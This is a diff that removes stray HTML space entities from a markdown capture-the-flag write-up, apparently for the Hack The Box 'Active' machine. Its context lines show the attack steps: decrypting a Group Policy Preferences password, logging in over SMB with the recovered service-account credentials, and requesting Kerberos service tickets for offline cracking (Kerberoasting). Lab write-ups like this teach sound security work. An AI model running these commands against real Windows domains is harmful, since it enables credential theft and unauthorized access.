@@ -98,7 +98,7 @@ $ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCu
 GPPstillStandingStrong2k18
 ```
 
-Now, we have a password of a service account to use. With this, we can read the `C:\Users` directory and find the flag in the Desktop of `SVC_TGS` user.&#x20;
+Now, we have a password of a service account to use. With this, we can read the `C:\Users` directory and find the flag in the Desktop of `SVC_TGS` user.
 
 ```
 $ smbmap -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -H 10.129.192.152 
@@ -118,7 +118,7 @@ $ smbmap -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -H 10.129.192.152
 
 ### Kerberoasting
 
-We have access to a service account here, and it is for the Ticket Granting Service. As such, we can attempt to do Kerberoasting.&#x20;
+We have access to a service account here, and it is for the Ticket Granting Service. As such, we can attempt to do Kerberoasting.
 
 ```
 $ impacket-GetUserSPNs -request -dc-ip 10.129.192.152 active.htb/SVC_TGS -outputfile hashes.kerberoast 
